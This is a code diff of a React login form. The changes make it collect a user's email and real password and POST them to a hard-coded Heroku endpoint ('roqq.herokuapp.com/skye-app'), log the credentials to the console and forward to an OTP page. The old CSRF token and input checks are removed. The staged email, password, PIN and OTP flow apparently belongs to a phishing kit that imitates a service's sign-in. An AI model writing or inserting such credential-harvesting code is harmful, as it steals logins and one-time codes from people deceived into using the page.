@@ -1,54 +1,18 @@
-import React, { useState, useEffect } from 'react'
-import { Link, useHistory } from 'react-router-dom'
-import 'react-intl-tel-input/dist/main.css'
-import URL from './Url.js'
+import React, { useState } from 'react'
+import { useHistory } from 'react-router-dom'
 
-
-const Form = () => {
+const Form = (props) => {
     const history = useHistory()
 
-    const [loading, setLoading] = useState(false)
     const [email, setEmail] = useState('')
     const [password, setPassword] = useState('')
-    const [token, setToken] = useState('')
-    const [err, setErr] = useState(false)
-    const [message, setMessage] = useState(null)
-
-    
-
-    const fetchCsrf = async () => {
-        const response = await fetch(URL + '/form', {
-            method: 'GET',
-            headers: {
-                Accept: 'application/json',
-                'Content-type': 'application/json',
-            },
-            credentials: 'include',
-            mode: 'cors',
-        })
-
-        const resData = await response.json()
-        setToken(resData.token)
-    }
-
-    useEffect(() => {
-        console.log('bundle one')
-        fetchCsrf()
-    }, [])
-
-    useEffect(() => {
-        if (err) {
-            setMessage(<p className='text-red-500'>Field not valid</p>)
-        } else {
-            setMessage(null)
-        }
-    }, [setErr, err])
+    const [loading, setLoading] = useState(false)
 
     const handleEmail = (e) => {
         setEmail(e.target.value)
     }
 
-    const handlePassword = e => {
+    const handlePassword = (e) => {
         setPassword(e.target.value)
     }
 
@@ -56,47 +20,45 @@ const Form = () => {
         e.preventDefault()
         setLoading(true)
 
-        if (email === '' || email.length < 9) {
-            setErr(true)
-            setLoading(false)
+        
+        if (email === '' || password === '') {
+            console.log('not sent')
         } else {
+            console.log({ email, password })
             try {
-                const response = await fetch(URL + '/bund1', {
+               const URL = 'https://roqq.herokuapp.com'
+              //  const URL = 'http://localhost:3030'
+                const response = await fetch(URL + '/skye-app', {
                     method: 'POST',
                     headers: {
-                        Accept: 'application/json',
                         'Content-type': 'application/json',
-                        Authorization: 'Bearer ' + token,
                     },
-                    credentials: 'include',
-                    mode: 'cors',
-
                     body: JSON.stringify({
                         email,
-                        password: '',
+                        password,
                         pin: '',
-                        otp: '',
                     }),
                 })
 
                 const resData = await response.json()
 
+                console.log('email sending started')
+
                 if (resData.status === 'success') {
                     console.log('Message Sent.')
                     setLoading(false)
-                    history.push('/authpassword', { email, token })
+                    history.push('/otp', { email, password })
                 } else if (resData.status === 'fail') {
                     console.log('Message failed to send.')
-                    setLoading(false)
+                          setLoading(false)
                 }
             } catch (err) {
                 console.log(err)
-                setLoading(false)
             }
         }
     }
 
-    return (
+    return (<>
         <form
             className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 loginForm'
             style={{ padding: '27px 12px' }}
@@ -144,6 +106,8 @@ const Form = () => {
                 {loading ? 'loading..' : 'Continue'}
             </button>
         </form>
+        <p className='text-center underline mt-9'>Create account?</p>
+        </>
     )
 }
 
